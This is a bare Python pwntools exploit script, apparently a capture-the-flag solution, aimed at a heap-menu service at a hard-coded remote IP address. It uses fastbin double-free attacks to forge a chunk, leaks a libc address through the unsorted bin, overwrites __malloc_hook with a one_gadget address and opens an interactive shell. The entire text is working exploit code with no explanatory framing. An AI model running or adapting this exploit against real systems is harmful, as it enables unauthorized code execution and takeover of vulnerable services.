from pwn import *

io=remote('39.108.238.37',55555)
libc=ELF('./libc-2.23.so')

def add(size,data):
    io.recvuntil('4. exit\n')
    io.sendline('1')
    io.recvuntil('heap_size?')
    io.sendline(str(size))
    io.recvuntil('heap_content?')
    io.send(data)

def free(index):
    io.recvuntil('4. exit\n')
    io.sendline('2')
    io.recvuntil('heap_index?')
    io.sendline(str(index))

def show(index):
    io.recvuntil('4. exit\n')
    io.sendline('3')
    io.recvuntil('heap_index?')
    io.sendline(str(index))

fake=p64(0)+p64(0x41)
fake_ad=0x00602060
io.send(fake)

add(0x30,'aaa')#0
add(0x30,'bbb')#1
free(0)
free(1)
free(0)
add(0x30,p64(fake_ad))#2
add(0x30,'ccc') #3
add(0x30,'ddd') #4 
add(0x30,'a'*8+p64(0x200)) #5 fake

#unsortbin 
add(0x100,'eeee')#6
add(0x100,'fffff')#7
free(6)
show(6)
io.recvuntil('heap6: ')
ubin=u64(io.recv(6).ljust(8,'\x00'))
print(hex(ubin))
libc_base=ubin-0x3c4b78

#fastbinattack
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0xf1147
add(0x60,'mmm')#8
add(0x60,'kkk')#9
free(8)
free(9)
free(8)
add(0x60,p64(malloc_hook-0x23))#10
add(0x60,'lll')
add(0x60,'qqq')
add(0x60,'a'*0x13+p64(one_gadget))#malloc_hook
print('done')

#getshell
io.sendline('1')
pause()
io.sendline('16')
io.interactive()
